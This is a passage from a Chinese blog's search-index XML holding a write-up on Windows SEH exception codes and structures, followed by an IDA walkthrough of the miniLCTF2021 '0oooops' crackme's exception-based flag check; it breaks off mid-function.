<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>SEH</title>
    <url>/2023/12/11/SEH/</url>
    <content><![CDATA[<p>记录一些SEH相关的reverse题目&#x2F;知识点</p>
<span id="more"></span>
<p><a href="https://www.yunzh1jun.com/2022/05/27/WindowsSEH/" target="_blank">这篇</a>写的挺好的<br>最近做了好些异常相关的题目 有必要总结以下知识点</p>
<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><h2 id="异常值"><a href="#异常值" class="headerlink" title="异常值"></a>异常值</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">EXCEPTION_ACCESS_VIOLATION         <span class="number">0xC0000005</span>     </span><br><span class="line">程序企图读写一个不可访问的地址时引发的异常。例如企图读取<span class="number">0</span>地址处的内存。</span><br><span class="line">EXCEPTION_ARRAY_BOUNDS_EXCEEDED    <span class="number">0xC000008C</span>     </span><br><span class="line">数组访问越界时引发的异常。</span><br><span class="line">EXCEPTION_BREAKPOINT               <span class="number">0x80000003</span>     </span><br><span class="line">触发断点时引发的异常。</span><br><span class="line">EXCEPTION_DATATYPE_MISALIGNMENT    <span class="number">0x80000002</span>     </span><br><span class="line">程序读取一个未经对齐的数据时引发的异常。</span><br><span class="line">EXCEPTION_FLT_DENORMAL_OPERAND     <span class="number">0xC000008D</span>     </span><br><span class="line">如果浮点数操作的操作数是非正常的，则引发该异常。所谓非正常，即它的值太小以至于不能用标准格式表示出来。</span><br><span class="line">EXCEPTION_FLT_DIVIDE_BY_ZERO       <span class="number">0xC000008E</span>     </span><br><span class="line">浮点数除法的除数是<span class="number">0</span>时引发该异常。</span><br><span class="line">EXCEPTION_FLT_INEXACT_RESULT       <span class="number">0xC000008F</span>     </span><br><span class="line">浮点数操作的结果不能精确表示成小数时引发该异常。</span><br><span class="line">EXCEPTION_FLT_INVALID_OPERATION    <span class="number">0xC0000090</span>     </span><br><span class="line">该异常表示不包括在这个表内的其它浮点数异常。</span><br><span class="line">EXCEPTION_FLT_OVERFLOW             <span class="number">0xC0000091</span>     </span><br><span class="line">浮点数的指数超过所能表示的最大值时引发该异常。</span><br><span class="line">EXCEPTION_FLT_STACK_CHECK          <span class="number">0xC0000092</span>     </span><br><span class="line">进行浮点数运算时栈发生溢出或下溢时引发该异常。</span><br><span class="line">EXCEPTION_FLT_UNDERFLOW            <span class="number">0xC0000093</span>     </span><br><span class="line">浮点数的指数小于所能表示的最小值时引发该异常。</span><br><span class="line">EXCEPTION_ILLEGAL_INSTRUCTION      <span class="number">0xC000001D</span>     </span><br><span class="line">程序企图执行一个无效的指令时引发该异常。</span><br><span class="line">EXCEPTION_IN_PAGE_ERROR            <span class="number">0xC0000006</span>     </span><br><span class="line">程序要访问的内存页不在物理内存中时引发的异常。</span><br><span class="line">EXCEPTION_INT_DIVIDE_BY_ZERO       <span class="number">0xC0000094</span>     </span><br><span class="line">整数除法的除数是<span class="number">0</span>时引发该异常。</span><br><span class="line">EXCEPTION_INT_OVERFLOW             <span class="number">0xC0000095</span>     </span><br><span class="line">整数操作的结果溢出时引发该异常。</span><br><span class="line">EXCEPTION_INVALID_DISPOSITION      <span class="number">0xC0000026</span>     </span><br><span class="line">异常处理器返回一个无效的处理的时引发该异常。</span><br><span class="line">EXCEPTION_NONCONTINUABLE_EXCEPTION <span class="number">0xC0000025</span>     </span><br><span class="line">发生一个不可继续执行的异常时，如果程序继续执行，则会引发该异常。</span><br><span class="line">EXCEPTION_PRIV_INSTRUCTION         <span class="number">0xC0000096</span>     </span><br><span class="line">程序企图执行一条当前CPU模式不允许的指令时引发该异常。</span><br><span class="line">EXCEPTION_SINGLE_STEP              <span class="number">0x80000004</span>     </span><br><span class="line">标志寄存器的TF位为<span class="number">1</span>时，每执行一条指令就会引发该异常。主要用于单步调试。</span><br><span class="line">EXCEPTION_STACK_OVERFLOW           <span class="number">0xC00000FD</span>     </span><br><span class="line">栈溢出时引发该异常。</span><br></pre></td></tr></table></figure>

<h2 id="SEH链"><a href="#SEH链" class="headerlink" title="SEH链"></a>SEH链</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_EXCEPTION_REGISTRATION_RECORD</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_EXCEPTION_REGISTRATION_RECORD</span> *Next;</span><br><span class="line">    <span class="comment">//指向下一个 EXCEPTION_REGISTRATION_RECORD</span></span><br><span class="line"></span><br><span class="line">    PEXCEPTION_DISPOSITION Handler;  </span><br><span class="line">    <span class="comment">//指向异常处理函数</span></span><br><span class="line">&#125; EXCEPTION_REGISTRATION_RECORD,*PEXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure>

<h2 id="异常处理函数"><a href="#异常处理函数" class="headerlink" title="异常处理函数"></a>异常处理函数</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">EXCEPTION_DISPOSITION __cdecl _except_handler</span><br><span class="line">(</span><br><span class="line">  EXCEPTION_RECORD              *pRecord,</span><br><span class="line">  EXCEPTION_REGISTRATION_RECORD *pFrame,</span><br><span class="line">  CONTEXT                       *pContext,</span><br><span class="line">  PVOID                          pValue</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>重点分析第一个和第三个参数</p>
<h3 id="EXCEPTION-RECORD"><a href="#EXCEPTION-RECORD" class="headerlink" title="EXCEPTION_RECORD"></a>EXCEPTION_RECORD</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_EXCEPTION_RECORD</span> &#123;</span><br><span class="line">  DWORD                    ExceptionCode;<span class="comment">//异常代码</span></span><br><span class="line">  DWORD                    ExceptionFlags;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_EXCEPTION_RECORD</span> *ExceptionRecord;</span><br><span class="line">  PVOID                    ExceptionAddress;<span class="comment">//异常发生地址</span></span><br><span class="line">  DWORD                    NumberParameters;</span><br><span class="line">  ULONG_PTR                ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];</span><br><span class="line">&#125; EXCEPTION_RECORD;</span><br></pre></td></tr></table></figure>

<h3 id="CONTEXT"><a href="#CONTEXT" class="headerlink" title="CONTEXT"></a>CONTEXT</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_CONTEXT</span> &#123;</span><br><span class="line">    DWORD ContextFlags;</span><br><span class="line">    DWORD   Dr0;                <span class="comment">//0x04</span></span><br><span class="line">    DWORD   Dr1;                <span class="comment">//0x08</span></span><br><span class="line">    DWORD   Dr2;                <span class="comment">//0x0c</span></span><br><span class="line">    DWORD   Dr3;                <span class="comment">//0x10</span></span><br><span class="line">    DWORD   Dr6;                <span class="comment">//0x14</span></span><br><span class="line">    DWORD   Dr7;                <span class="comment">//0x18</span></span><br><span class="line"></span><br><span class="line">    FLOATING_SAVE_AREA FloatSave;</span><br><span class="line"></span><br><span class="line">    DWORD   SegGs;              <span class="comment">//0x88</span></span><br><span class="line">    DWORD   SegFs;              <span class="comment">//0x90</span></span><br><span class="line">    DWORD   SegEs;              <span class="comment">//0x94</span></span><br><span class="line">    DWORD   SegDs;              <span class="comment">//0x98</span></span><br><span class="line"></span><br><span class="line">    DWORD   Edi;                <span class="comment">//0x9c</span></span><br><span class="line">    DWORD   Esi;                <span class="comment">//0xa0</span></span><br><span class="line">    DWORD   Ebx;                <span class="comment">//0xa4</span></span><br><span class="line">    DWORD   Edx;                <span class="comment">//0xa8</span></span><br><span class="line">    DWORD   Ecx;                <span class="comment">//0xac</span></span><br><span class="line">    DWORD   Eax;                <span class="comment">//0xb0</span></span><br><span class="line">    DWORD   Ebp;                <span class="comment">//0xb4</span></span><br><span class="line">    DWORD   Eip;                <span class="comment">//0xb8</span></span><br><span class="line"></span><br><span class="line">    DWORD   SegCs;              <span class="comment">//0xbc MUST BE SANITIZED</span></span><br><span class="line">    DWORD   EFlags;             <span class="comment">//0xc0 MUST BE SANITIZED</span></span><br><span class="line">    DWORD   Esp;                <span class="comment">//0xc4</span></span><br><span class="line">    DWORD   SegSs;              <span class="comment">//0xc8</span></span><br><span class="line"></span><br><span class="line">    BYTE    ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];</span><br><span class="line">&#125; CONTEXT;</span><br></pre></td></tr></table></figure>
<p>注意里面的Eip成员(0xb8)<br>一般来说 当一句代码触发异常时 Eip指向这句代码结束的位置(便于处理完异常后能够正常执行后续代码)<br>但是在异常处理函数(Handler)中 可以修改CONTEXT-&gt;Eip!(可以用于反调试)</p>
<h2 id="结构化异常处理内部函数"><a href="#结构化异常处理内部函数" class="headerlink" title="结构化异常处理内部函数"></a>结构化异常处理内部函数</h2><p>C++提供两个可用于try-except内部的函数</p>
<ul>
<li>GetExceptionCode: 返回异常值</li>
<li>GetExceptionInformation: 返回一个指向EXCEPTION_POINTERS 结构的指针</li>
</ul>
<h3 id="EXCEPTION-POINTERS-结构体"><a href="#EXCEPTION-POINTERS-结构体" class="headerlink" title="EXCEPTION_POINTERS 结构体"></a>EXCEPTION_POINTERS 结构体</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_EXCEPTION_POINTERS</span> &#123;</span><br><span class="line">  PEXCEPTION_RECORD ExceptionRecord;</span><br><span class="line">  PCONTEXT          ContextRecord;</span><br><span class="line">&#125; EXCEPTION_POINTERS, *PEXCEPTION_POINTERS;</span><br></pre></td></tr></table></figure>


<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>要注意！有些异常触发是有条件的(比如将某个变量&gt;&gt;多少位 要移为0后才会触发除零异常(这时一般在Handler里都有对关键变量的操作) )<br>一些小技巧:</p>
<ul>
<li>选中变量按Y 输入正确类型让IDA更好识别</li>
<li>选中某些常量值按M IDA会自动转为宏 (比如 EXCEPTION_ACCESS_VIOLATION) 的形式</li>
</ul>
<h2 id="miniLCTF2021-0oooops"><a href="#miniLCTF2021-0oooops" class="headerlink" title="miniLCTF2021 0oooops"></a>miniLCTF2021 0oooops</h2><p>IDA打开</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE v4[<span class="number">108</span>]; <span class="comment">// [esp+E0h] [ebp-F0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Str[<span class="number">104</span>]; <span class="comment">// [esp+14Ch] [ebp-84h] BYREF</span></span><br><span class="line">  CPPEH_RECORD ms_exc; <span class="comment">// [esp+1B8h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">j_memset</span>(Str, <span class="number">0</span>, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(v4, <span class="string">&quot;Please input your flag: &quot;</span>);</span><br><span class="line">  <span class="built_in">j_memset</span>(&amp;v4[<span class="number">25</span>], <span class="number">0</span>, <span class="number">0x4B</span>u);</span><br><span class="line">  <span class="built_in">sub_2D10DC</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">char</span>)v4);</span><br><span class="line">  <span class="built_in">sub_2D1037</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">char</span>)Str);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)<span class="built_in">sub_2D12DA</span>(Str) )       <span class="comment">// 检查格式</span></span><br><span class="line">  &#123;</span><br><span class="line">    MEMORY[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    ms_exc.registration.TryLevel = <span class="number">-2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sub_2D126C</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里很明显触发了一个内存访问异常</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">EXCEPTION_ACCESS_VIOLATION         <span class="number">0xC0000005</span></span><br></pre></td></tr></table></figure>

<p>转到汇编查看 发现除了这个异常外还触发了一个除零异常</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">002</span>D2330 ;   __try &#123; <span class="comment">// __except at loc_2D2377</span></span><br><span class="line">.text:<span class="number">002</span>D2330                 mov     [ebp+ms_exc.registration.TryLevel], <span class="number">0</span></span><br><span class="line">.text:<span class="number">002</span>D2337                 lea     ebx, [ebp+Str]</span><br><span class="line">.text:<span class="number">002</span>D233D                 <span class="keyword">xor</span>     eax, eax</span><br><span class="line">.text:<span class="number">002</span>D233F                 db      <span class="number">3</span>Eh</span><br><span class="line">.text:<span class="number">002</span>D233F                 mov     dword ptr [eax], <span class="number">0</span></span><br><span class="line">.text:<span class="number">002</span>D2346                 mov     edx, <span class="number">0</span></span><br><span class="line">.text:<span class="number">002</span>D234B                 div     edx             ; 除零异常!</span><br><span class="line">.text:<span class="number">002</span>D234B ;   &#125; <span class="comment">// starts at 2D2330</span></span><br><span class="line">.text:<span class="number">002</span>D234D                 mov     [ebp+ms_exc.registration.TryLevel], <span class="number">0F</span>FFFFFFEh</span><br><span class="line">.text:<span class="number">002</span>D2354                 jmp     <span class="type">short</span> loc_2D2381</span><br></pre></td></tr></table></figure>
<p>这里先处理的是除零异常(为什么是这个顺序还没弄懂…) 跳转到2D2377</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">loc_2D2377:</span><br><span class="line">;   __except(loc_2D2356) <span class="comment">// owned by 2D2330</span></span><br><span class="line">mov     esp, [ebp+ms_exc.old_esp]</span><br><span class="line">mov     [ebp+ms_exc.registration.TryLevel], <span class="number">0F</span>FFFFFFEh</span><br></pre></td></tr></table></figure>
<p>跟进2D2356</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">loc_2D2356:</span><br><span class="line">;   __except filter <span class="comment">// owned by 2D2330</span></span><br><span class="line">mov     eax, [ebp+ms_exc.exc_ptr]</span><br><span class="line">mov     ecx, [eax]</span><br><span class="line">mov     edx, [ecx]</span><br><span class="line">mov     [ebp+var_1BC], edx</span><br><span class="line">mov     eax, [ebp+ms_exc.exc_ptr]</span><br><span class="line">push    eax</span><br><span class="line">mov     ecx, [ebp+var_1BC]</span><br><span class="line">push    ecx</span><br><span class="line">call    sub_2D1131</span><br><span class="line">add     esp, <span class="number">8</span></span><br><span class="line">retn</span><br></pre></td></tr></table></figure>

<p>查看这个sub_2D1131跟进到</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">sub_411DD0</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+D0h] [ebp-40h]</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">40</span>]; <span class="comment">// [esp+DCh] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+104h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_41D015);</span><br><span class="line">  <span class="keyword">if</span> ( **(_DWORD **)a2 != <span class="number">-1073741676</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v5 = *(_DWORD *)(*(_DWORD *)(a2 + <span class="number">4</span>) + <span class="number">164</span>) + <span class="number">9</span>;</span><br><span class="line">  <span class="built_in">qmemcpy</span>(v4, <span class="string">&quot;!V -&#125;VG-bp&#125;m-nG!b|ra GyGE|Drp D&quot;</span>, <span class="number">31</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x1F</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[i] != ((<span class="type">unsigned</span> __int8)*(_DWORD *)(*(_DWORD *)(a2 + <span class="number">4</span>) + <span class="number">184</span>) ^ ((*(<span class="type">char</span> *)(v5 + <span class="number">2</span> * i + <span class="number">1</span>) ^ <span class="number">0x4D</span>) - <span class="number">4</span>) ^ <span class="number">0x13</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(*(_DWORD *)(a2 + <span class="number">4</span>) + <span class="number">184</span>) += <span class="number">54</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_DWORD *)(*(_DWORD *)(a2 + <span class="number">4</span>) + <span class="number">184</span>) += <span class="number">63</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现这里特别乱 主要是因为a2的类型还是DWORD导致IDA没办法准确识别结构<br>通过-1073741676(0xC0000094) 可以知道这是FILTER 那么a2的类型就应该为 _EXCEPTION_POINTERS *a2<br>在IDA选中a2 按Y 改为 _EXCEPTION_POINTERS *a2 修改a2类型 方便程序识别<br>修改a2类型后代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">sub_2D1DD0</span><span class="params">(<span class="type">int</span> a1, _EXCEPTION_POINTERS *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+D0h] [ebp-40h]</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">40</span>]; <span class="comment">// [esp+DCh] [ebp-34h] BYREF</span></span><br><span class="line">  DWORD v5; <span class="comment">// [esp+104h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_2DD015);</span><br><span class="line">  <span class="keyword">if</span> ( a2-&gt;ExceptionRecord-&gt;ExceptionCode != <span class="number">0xC0000094</span> )<span class="comment">// EXCEPTION FILTER!</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;                                   <span class="comment">// 这里把a2类型转换为 _EXCEPTION_POINTERS *a2 方便IDA识别</span></span><br><span class="line">  v5 = a2-&gt;ContextRecord-&gt;Ebx + <span class="number">9</span>;</span><br><span class="line">  <span class="built_in">qmemcpy</span>(v4, <span class="string">&quot;!V -&#125;VG-bp&#125;m-nG!b|ra GyGE|Drp D&quot;</span>, <span class="number">31</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x1F</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[i] != ((<span class="type">unsigned</span> __int8)a2-&gt;ContextRecord-&gt;Eip ^ ((*(<span class="type">char</span> *)(v5 + <span class="number">2</span> * i + <span class="number">1</span>) ^ <span class="number">0x4D</span>) - <span class="number">4</span>) ^ <span class="number">0x13</span>) )<span class="comment">// 奇数字符加密</span></span><br><span class="line">    &#123;                                           <span class="comment">// 这里的Eip指向__try块结束的地址 002D234B 所以取4B(最后一字节)</span></span><br><span class="line">      a2-&gt;ContextRecord-&gt;Eip += <span class="number">54</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  a2-&gt;ContextRecord-&gt;Eip += <span class="number">63</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样就清晰多了<br>这个函数对输入字符的奇数位进行了加密 check<br>逆回去需要知道这里 (unsigned __int8)a2-&gt;ContextRecord-&gt;Eip 的值<br>这个值指向的是__try块结束的地址 IDA找到</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">00412330</span> ;   __try &#123; <span class="comment">// __except at loc_412377</span></span><br><span class="line">.text:<span class="number">00412330</span>                 mov     [ebp+ms_exc.registration.TryLevel], <span class="number">0</span></span><br><span class="line">.text:<span class="number">00412337</span>                 lea     ebx, [ebp+Str]</span><br><span class="line">.text:<span class="number">0041233</span>D                 <span class="keyword">xor</span>     eax, eax</span><br><span class="line">.text:<span class="number">0041233F</span>                 db      <span class="number">3</span>Eh</span><br><span class="line">.text:<span class="number">0041233F</span>                 mov     dword ptr [eax], <span class="number">0</span></span><br><span class="line">.text:<span class="number">00412346</span>                 mov     edx, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0041234B</span>                 div     edx</span><br><span class="line">.text:<span class="number">0041234B</span> ;   &#125; <span class="comment">// starts at 412330</span></span><br></pre></td></tr></table></figure>

<p>可以看到这里结束位置为 41234B 那么取unsigned int8 就是 4B 所以xor的值为0x4B</p>
<p>那内存异常呢？？？<br>敏锐的可以发现这里有个TlsCallback_0_0</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">PVOID __stdcall <span class="title">TlsCallback_0_0</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_41D015);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">AddVectoredExceptionHandler</span>(<span class="number">1u</span>, Handler);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以通过这个VEH机制(tcl 还不会…) 来处理的这个内存异常<br>查看Handler</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __stdcall <span class="title">sub_411BD0</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+D0h] [ebp-40h]</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">40</span>]; <span class="comment">// [esp+DCh] [ebp-34h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+104h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_41D015);</span><br><span class="line">  <span class="keyword">if</span> ( **(_DWORD **)a1 != <span class="number">-1073741819</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v4 = *(_DWORD *)(*(_DWORD *)(a1 + <span class="number">4</span>) + <span class="number">164</span>) + <span class="number">9</span>;</span><br><span class="line">  v3[<span class="number">0</span>] = <span class="number">16</span>;</span><br><span class="line">  v3[<span class="number">1</span>] = <span class="number">4</span>;</span><br><span class="line">  v3[<span class="number">2</span>] = <span class="number">24</span>;</span><br><span class="line">  v3[<span class="number">3</span>] = <span class="number">11</span>;</span><br><span class="line">  v3[<span class="number">4</span>] = <span class="number">24</span>;</span><br><span class="line">  v3[<span class="number">5</span>] = <span class="number">16</span>;</span><br><span class="line">  v3[<span class="number">6</span>] = <span class="number">4</span>;</span><br><span class="line">  v3[<span class="number">7</span>] = <span class="number">21</span>;</span><br><span class="line">  v3[<span class="number">8</span>] = <span class="number">11</span>;</span><br><span class="line">  v3[<span class="number">9</span>] = <span class="number">5</span>;</span><br><span class="line">  v3[<span class="number">10</span>] = <span class="number">31</span>;</span><br><span class="line">  v3[<span class="number">11</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">12</span>] = <span class="number">33</span>;</span><br><span class="line">  v3[<span class="number">13</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">14</span>] = <span class="number">72</span>;</span><br><span class="line">  v3[<span class="number">15</span>] = <span class="number">21</span>;</span><br><span class="line">  v3[<span class="number">16</span>] = <span class="number">6</span>;</span><br><span class="line">  v3[<span class="number">17</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">18</span>] = <span class="number">17</span>;</span><br><span class="line">  v3[<span class="number">19</span>] = <span class="number">69</span>;</span><br><span class="line">  v3[<span class="number">20</span>] = <span class="number">5</span>;</span><br><span class="line">  v3[<span class="number">21</span>] = <span class="number">62</span>;</span><br><span class="line">  v3[<span class="number">22</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">23</span>] = <span class="number">24</span>;</span><br><span class="line">  v3[<span class="number">24</span>] = <span class="number">21</span>;</span><br><span class="line">  v3[<span class="number">25</span>] = <span class="number">72</span>;</span><br><span class="line">  v3[<span class="number">26</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">27</span>] = <span class="number">69</span>;</span><br><span class="line">  v3[<span class="number">28</span>] = <span class="number">33</span>;</span><br><span class="line">  v3[<span class="number">29</span>] = <span class="number">31</span>;</span><br><span class="line">  v3[<span class="number">30</span>] = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x1F</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v3[i] != (((*(<span class="type">char</span> *)(v4 + <span class="number">2</span> * i) ^ <span class="number">0x37</span>) + <span class="number">4</span>) ^ <span class="number">0x42</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(*(_DWORD *)(a1 + <span class="number">4</span>) + <span class="number">184</span>) += <span class="number">66</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_DWORD *)(*(_DWORD *)(a1 + <span class="number">4</span>) + <span class="number">184</span>) += <span class="number">7</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再次把a1也修改为_EXCEPTION_POINTERS* 类型</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __stdcall <span class="title">sub_411BD0</span><span class="params">(_EXCEPTION_POINTERS *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+D0h] [ebp-40h]</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">40</span>]; <span class="comment">// [esp+DCh] [ebp-34h]</span></span><br><span class="line">  DWORD v4; <span class="comment">// [esp+104h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_41D015);</span><br><span class="line">  <span class="keyword">if</span> ( a1-&gt;ExceptionRecord-&gt;ExceptionCode != <span class="number">0xC0000005</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v4 = a1-&gt;ContextRecord-&gt;Ebx + <span class="number">9</span>;</span><br><span class="line">  v3[<span class="number">0</span>] = <span class="number">16</span>;</span><br><span class="line">  v3[<span class="number">1</span>] = <span class="number">4</span>;</span><br><span class="line">  v3[<span class="number">2</span>] = <span class="number">24</span>;</span><br><span class="line">  v3[<span class="number">3</span>] = <span class="number">11</span>;</span><br><span class="line">  v3[<span class="number">4</span>] = <span class="number">24</span>;</span><br><span class="line">  v3[<span class="number">5</span>] = <span class="number">16</span>;</span><br><span class="line">  v3[<span class="number">6</span>] = <span class="number">4</span>;</span><br><span class="line">  v3[<span class="number">7</span>] = <span class="number">21</span>;</span><br><span class="line">  v3[<span class="number">8</span>] = <span class="number">11</span>;</span><br><span class="line">  v3[<span class="number">9</span>] = <span class="number">5</span>;</span><br><span class="line">  v3[<span class="number">10</span>] = <span class="number">31</span>;</span><br><span class="line">  v3[<span class="number">11</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">12</span>] = <span class="number">33</span>;</span><br><span class="line">  v3[<span class="number">13</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">14</span>] = <span class="number">72</span>;</span><br><span class="line">  v3[<span class="number">15</span>] = <span class="number">21</span>;</span><br><span class="line">  v3[<span class="number">16</span>] = <span class="number">6</span>;</span><br><span class="line">  v3[<span class="number">17</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">18</span>] = <span class="number">17</span>;</span><br><span class="line">  v3[<span class="number">19</span>] = <span class="number">69</span>;</span><br><span class="line">  v3[<span class="number">20</span>] = <span class="number">5</span>;</span><br><span class="line">  v3[<span class="number">21</span>] = <span class="number">62</span>;</span><br><span class="line">  v3[<span class="number">22</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">23</span>] = <span class="number">24</span>;</span><br><span class="line">  v3[<span class="number">24</span>] = <span class="number">21</span>;</span><br><span class="line">  v3[<span class="number">25</span>] = <span class="number">72</span>;</span><br><span class="line">  v3[<span class="number">26</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">27</span>] = <span class="number">69</span>;</span><br><span class="line">  v3[<span class="number">28</span>] = <span class="number">33</span>;</span><br><span class="line">  v3[<span class="number">29</span>] = <span class="number">31</span>;</span><br><span class="line">  v3[<span class="number">30</span>] = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x1F</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v3[i] != (((*(<span class="type">char</span> *)(v4 + <span class="number">2</span> * i) ^ <span class="number">0x37</span>) + <span class="number">4</span>) ^ <span class="number">0x42</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      